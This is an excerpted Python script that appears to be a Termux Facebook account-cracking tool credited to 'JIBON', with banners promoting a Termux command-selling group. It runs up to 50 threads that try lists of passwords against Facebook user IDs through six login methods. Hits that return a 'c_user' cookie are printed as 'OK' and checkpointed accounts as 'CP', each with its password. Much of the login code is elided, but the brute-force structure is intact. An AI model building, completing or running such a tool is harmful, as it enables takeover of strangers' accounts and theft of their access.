#created by JIBON aka Aryan chaudhary
#open source by JIBON
#github= JIBON
#BY BY MEY KABHI WAPIS NAHI AAUNGA AB 
#JAI NEPAL
# fb id https://www.facebook.com/jibon.islam65653?mibextid=ZbWKwL
...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/MRXJIBON/new-hard/blob/main/new-hard.txt').text
		ua=open('.ua2.txt','w')
...
[+]==============================================
[+] CREATED BY   :  MD JIBON ISLAM 
[+] FB GROUP     :  TERMUX  COMMAND SELL
[+] ON GITHUB    :  MRXJIBON
[+] TOOL STATUS  :  RANDOM
[+] TOOL VIRSION :  0.3
[+]=============================================="""
...
def JIBON1():
	...
	print("[+]==============================================")
	JIBONlovesyou = input("[+] [CHOOSE] :- ")
	if JIBONlovesyou in ['y','Y','1','yes','YES','Yes']:
		JIBON_xd.append('y')
	else:
		JIBON_xd.append('n')
	print("[+]==============================================")
	...
	print("[+]==============================================")
	JIBONtop = input("[+] [CHOOSE] :- ")
	if JIBONtop in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	with ThreadPool(max_workers=30) as yaari:
		...
		print(f'[+] METHOD CHOOSED : M{JIBONfire}')
		...
		for guru in user:
			...
			if JIBONfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif JIBONfire =='2':yaari.submit(p,uid,pwx,tl)
			elif JIBONfire =='3':yaari.submit(x,uid,pwx,tl)
			elif JIBONfire =='4':yaari.submit(mobile,uid,pwx,tl)
			elif JIBONfire =='5':yaari.submit(freeq,uid,pwx,tl)
			elif JIBONfire =='6':yaari.submit(d,uid,pwx,tl)
			else:
...
def JIBON5():
	...
	with ThreadPool(max_workers=50) as manshera:
		...
		for love in user:
			...
			for Eman in HamiiID:
				pwx.append(Eman)
			if JIBONfire =='1':manshera.submit(mbasic,uid,pwx,tl)
			elif JIBONfire =='2':manshera.submit(p,uid,pwx,tl)
			elif JIBONfire =='3':manshera.submit(x,uid,pwx,tl)
			elif JIBONfire =='4':manshera.submit(mobile,uid,pwx,tl)
			elif JIBONfire =='5':manshera.submit(freeq,uid,pwx,tl)
			elif JIBONfire =='6':manshera.submit(d,uid,pwx,tl)
			else:
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[JIBON-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in JIBON_xd:
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[JIBON-CP] '+cid+' | '+ps+'\33[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-JIBON] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-JIBON] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-JIBON] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-JIBON] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-JIBON] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-JIBON] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
